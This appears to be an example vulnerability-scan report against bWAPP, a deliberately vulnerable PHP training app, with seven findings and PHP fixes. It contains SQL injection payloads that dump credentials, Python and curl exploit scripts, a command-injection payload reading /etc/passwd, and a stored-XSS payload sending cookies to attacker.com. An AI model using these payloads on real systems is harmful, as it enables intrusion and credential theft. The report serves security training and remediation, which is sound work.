# Example Scan Report — bWAPP
## http://www.itsecgames.com

> This is an example of a WTSA scan output for reference.
> bWAPP is a deliberately vulnerable PHP/MySQL training application by Malik Mesellem (@MME_IT).
> Default credentials: bee / bug

---

## WTSA Scan — bWAPP (ITSEC Games)
**Target:** http://www.itsecgames.com  
**Date:** March 2026  
**Stack:** PHP 5.2.4 + Apache 2.2.8 + MySQL (Ubuntu Linux)  
**WAF:** None (security_level=0)  
**Modules:** XSS, SQLi, CMDi  

---

### Overall Risk: 🔴 CRITICAL

| Severity | Count |
|---|---|
| 🔴 Critical | 3 |
| 🟠 High | 2 |
| 🟡 Medium | 2 |
| **Total** | **7** |

---

### Fingerprint

| Property | Value |
|---|---|
| Application | bWAPP v2.2 — 100+ intentional vulnerabilities |
| Backend | PHP 5.2.4 |
| Web Server | Apache 2.2.8 (Ubuntu) + mod_fastcgi |
| Database | MySQL |
| OS | Ubuntu Linux |
| WAF | None |
| Security Level | Low (security_level=0) |
| Auth | Required (bee / bug) |
| Cookie | PHPSESSID (no HttpOnly, no Secure) |
| Confidence | High |

---

### Threats Detected

---

#### Finding 01 — 🔴 SQL Injection: Movie Search UNION Extraction | CVSS 9.8 | CWE-89

**Endpoint:** `GET /bWAPP/sqli_1.php`  
**Parameter:** `title`  
**Column count:** 6 (confirmed)  
**Payload:** `blah' union select 1,login,password,email,secret,7 from users--`  
**Confidence:** Confirmed  

**Key payloads (escalating):**
```
blah' or 1=1--                                           ← confirms injection
blah' union select 1,1,1,1,1,1--                        ← confirms 6 columns
blah' union select 1,DATABASE(),3,4,5,6--               ← extracts DB name: bWAPP
blah' union select 1,table_name,3,4,5,6 from information_schema.tables where table_schema=database()--
blah' union select 1,login,password,email,secret,7 from users--  ← dumps credentials
```

**Exploit Script:**
```python
# LEGAL DISCLAIMER: Authorised use only — bWAPP is a training target.
import requests

TARGET = 'http://www.itsecgames.com/bWAPP'
s = requests.Session()
s.post(f'{TARGET}/login.php', data={
    'login': 'bee', 'password': 'bug', 'security_level': '0', 'form': 'submit'
})

# Dump credentials
r = s.get(f'{TARGET}/sqli_1.php', params={
    'title': "blah' union select 1,login,password,email,secret,7 from users--",
    'action': 'search'
})
print(r.text)
```

**curl PoC:**
```bash
curl -s -b 'PHPSESSID=<token>;security_level=0' \
  'http://www.itsecgames.com/bWAPP/sqli_1.php?title=blah%27+union+select+1%2CDATABASE%28%29%2C3%2C4%2C5%2C6--&action=search'
```

**Remediation (PHP):**
```php
// VULNERABLE:
$sql = "SELECT * FROM movies WHERE title LIKE '%" . $title . "%'";

// FIXED — PDO prepared statement:
$pdo = new PDO('mysql:host=localhost;dbname=bWAPP', $user, $pass);
$stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE ?");
$stmt->execute(["%" . $title . "%"]);
$movies = $stmt->fetchAll();
```

---

#### Finding 02 — 🔴 SQL Injection: Login Form Authentication Bypass | CVSS 9.8 | CWE-89

**Endpoint:** `POST /bWAPP/login.php`  
**Parameter:** `login`  
**Payload:** `' OR '1'='1'--`  

**Remediation:**
```php
// FIXED:
$stmt = $pdo->prepare("SELECT * FROM users WHERE login=? AND password=?");
$stmt->execute([$login, md5($password)]);
```

---

#### Finding 03 — 🔴 OS Command Injection: DNS Lookup | CVSS 9.8 | CWE-78

**Endpoint:** `GET /bWAPP/commandi.php`  
**Parameter:** `target`  
**Payload:** `127.0.0.1; id; whoami; uname -a; cat /etc/passwd`  
**Evidence:** `uid=33(www-data) gid=33(www-data)` returned inline with DNS results  

**Exploit Script:**
```python
# LEGAL DISCLAIMER: Authorised use only.
import requests, time

TARGET = 'http://www.itsecgames.com/bWAPP'
s = requests.Session()
s.post(f'{TARGET}/login.php', data={'login':'bee','password':'bug','security_level':'0','form':'submit'})

for cmd in ['127.0.0.1; id', '127.0.0.1; cat /etc/passwd', '127.0.0.1; uname -a']:
    r = s.get(f'{TARGET}/commandi.php', params={'target': cmd})
    print(f'[*] {cmd}')
    if 'root' in r.text or 'www-data' in r.text:
        print('[+] RCE confirmed')
```

**Remediation (PHP):**
```php
// VULNERABLE:
$result = shell_exec('nslookup ' . $_GET['target']);

// FIXED:
$target = filter_var($_GET['target'], FILTER_VALIDATE_IP);
if (!$target) die('Invalid input');
$result = shell_exec('nslookup ' . escapeshellarg($target));

// BEST: avoid shell calls entirely
$records = dns_get_record($target, DNS_A);
```

---

#### Finding 04 — 🟠 SQL Injection: Boolean Blind (sqli_6.php) | CVSS 8.8 | CWE-89

**Endpoint:** `POST /bWAPP/sqli_6.php`  
**Parameter:** `login`  
**True condition:** `bee' AND '1'='1` → "User found"  
**False condition:** `bee' AND '1'='2` → empty response  
**AI payload:** `bee' AND SUBSTRING(password,1,1)='6`  

---

#### Finding 05 — 🟠 Stored XSS: Blog Entry | CVSS 8.8 | CWE-79

**Endpoint:** `POST /bWAPP/xss_stored_1.php`  
**Parameter:** `entry`  
**Payload:** `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`  

**Remediation:**
```php
// FIXED:
$stmt = $pdo->prepare("INSERT INTO blog (entry, owner_id) VALUES (?, ?)");
$stmt->execute([$entry, $user_id]);

// On output:
echo htmlspecialchars($row['entry'], ENT_QUOTES, 'UTF-8');
```

---

#### Finding 06 — 🟡 Reflected XSS: GET Parameters | CVSS 6.1 | CWE-79

**Endpoint:** `GET /bWAPP/xss_get.php`  
**Parameters:** `firstname`, `lastname`  
**Payload:** `<script>alert(document.cookie)</script>`  

**Remediation:**
```php
echo "Hello " . htmlspecialchars($_GET['firstname'], ENT_QUOTES, 'UTF-8');
```

---

#### Finding 07 — 🟡 Reflected XSS: POST Parameter | CVSS 6.1 | CWE-79

**Endpoint:** `POST /bWAPP/xss_post.php`  
**Parameter:** `firstname`  
**Payload:** `<script>alert(document.cookie)</script>`  

---

### PHP Remediation Checklist

- [ ] Replace all `mysql_query()` / string-concatenated SQL with PDO prepared statements
- [ ] Apply `htmlspecialchars($val, ENT_QUOTES, 'UTF-8')` to all HTML output
- [ ] Apply `escapeshellarg()` to all shell function inputs — or use PHP-native DNS functions
- [ ] Set `HttpOnly` and `Secure` flags on `PHPSESSID` cookie
- [ ] Add `Content-Security-Policy: default-src 'self'` header
- [ ] Upgrade PHP from 5.2.4 to current 8.x release
- [ ] Upgrade Apache from 2.2.8 to current stable release
- [ ] Set `display_errors = Off` in `php.ini`
- [ ] Implement CSRF tokens on all state-changing forms
- [ ] Add input validation (whitelist approach) for all parameters
